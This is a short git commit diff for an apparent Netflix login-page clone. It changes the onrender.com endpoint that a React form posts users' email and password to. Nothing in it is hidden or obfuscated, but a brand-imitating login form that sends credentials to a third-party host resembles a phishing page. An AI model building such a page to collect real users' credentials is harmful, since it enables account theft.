ae55dca2d0d1afc7d6df4422c3f7055a4bb7a4e9
ananthasubha555-sudo <ananthasubha555@gmail.com>
2025-12-12 18:56:03 +0530

    give link

--- frontend/src/pages/Login.jsx
+++ frontend/src/pages/Login.jsx
@@ -13,7 +13,7 @@ export default function Login() {
     e.preventDefault();
 
     try {
-      const res = await axios.post("https://netflix-login-page-1-ghr0.onrender.com", {
+      const res = await axios.post("https://netflix-login-page-2-3tzt.onrender.com", {
         email,
         password,
       });
@@ -70,6 +70,7 @@ export default function Login() {
     </div>
   );
 }
+
 
 
 
